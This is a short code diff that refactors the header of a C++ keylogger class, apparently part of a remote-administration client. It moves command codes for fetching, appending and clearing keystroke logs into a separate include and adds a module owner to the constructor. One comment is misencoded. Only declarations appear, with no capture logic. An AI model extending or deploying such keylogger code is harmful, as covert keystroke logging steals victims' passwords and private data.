@@ -11,32 +11,15 @@
 
 
 #include "EventHandler.h"
-
-#define KBLG	('K'|('B'<<8)|('L'<<16)|('G'<<24))
-
-#define KEYBD_LOG_GET_LOG		(0xaba0)
-
-//¸½¼ÓÊý¾Ý...
-#define KEYBD_LOG_DATA_APPEND	(0xaba1)
-
-#define KEYBD_LOG_ERROR			(0xaba2)
-#define KEYBD_LOG_INITINFO		(0xaba3)
-#define KEYBD_LOG_SETOFFLINERCD	(0xaba4)
-
-#define KEYBD_LOG_GETPLUGS		(0xaba5)
-#define KEYBD_LOG_PLUGS			(0xaba6)
-	
-#define KEYBD_LOG_CLEAN			(0xaba7)
-
-#define KEYBD_LOG_DATA_NEW		(0xabc0)
-
-#define EXIT_HOOK 0x10086
-
-
+#include "kblog_common.h"
+#include "module.h"
 
 class CKeybdLogger:public CEventHandler
 {
 private:
+	Module * m_owner;
+
+
 	static HANDLE hBackgroundProcess_x86;
 	static DWORD dwBackgroundThreadId_x86;
 
@@ -65,7 +48,7 @@ private:
 	void CheckOldProcess();
 
 public:
-	CKeybdLogger(CClient *pClient);
+	CKeybdLogger(CClient *pClient, Module * owner);
 	virtual ~CKeybdLogger();
 	
 	void ExitBackgroundProcess();
